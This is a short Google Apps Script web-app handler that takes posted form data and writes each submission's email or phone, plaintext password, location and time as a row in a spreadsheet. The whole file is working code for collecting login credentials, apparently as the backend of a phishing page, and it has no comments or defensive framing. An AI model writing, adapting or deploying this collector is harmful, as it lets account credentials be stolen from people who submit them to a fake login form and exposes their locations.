const SHEET_NAME = "Sheet1";
const TIMESTAMP_COLUMN = "Timestamp";

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);
    if (!sheet) throw new Error(`Sheet '${SHEET_NAME}' not found.`);

    const formData = e.postData.contents ? JSON.parse(e.postData.contents) : {};

    const rowData = {
      EmailOrPhone: formData.emailOrPhone || "",
      Password: formData.password || "",
      Location: formData.location || "",
      Time: formData.time || "",
      [TIMESTAMP_COLUMN]: new Date().toISOString(),
    };

    appendToSheet(rowData, sheet);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
                         .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: error.message }))
                         .setMimeType(ContentService.MimeType.JSON);
  }
}

function appendToSheet(data, sheet) {
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];

  const row = headers.map(header => data[header] || "");
  sheet.appendRow(row);
}
